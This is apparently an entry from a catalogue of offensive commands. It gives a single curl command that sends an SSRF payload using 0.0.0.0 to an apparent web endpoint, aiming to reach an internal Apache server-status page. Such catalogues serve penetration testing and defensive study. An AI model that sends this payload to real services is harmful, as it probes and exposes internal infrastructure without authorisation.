---
data: >-
  curl -X POST -d 'url=http://0.0.0.0:8081/server-status'
  https://www.apitest.io/request
tags:
  - ssrf
  - bypass
type: command
output: null
executor: bash
platforms:
  - Linux
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T04:08:48.415Z'
id: 4efb063a-ac5c-4711-b40c-7a069b2c5e6b
verified: false
validated: true
submitted: true
---
# curl-ssrf-ip-bypass-any

## Command

```bash
curl -X POST -d 'url=http://0.0.0.0:8081/server-status' https://www.apitest.io/request
```

## Description

Uses 0.0.0.0 (ANY_IP) to bypass and access internal Apache.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | POST method | Yes |
| `-d 'url=...'` | ANY_IP URL | Yes |
| `https://www.apitest.io/request` | Endpoint | Yes |

## Examples

### Basic Usage

```bash
curl -X POST -d 'url=http://0.0.0.0:8081/server-status' https://www.apitest.io/request
```

## Expected Output

Details on Apache/2.2.15 configuration.

## Related

- [[Related Procedure]]
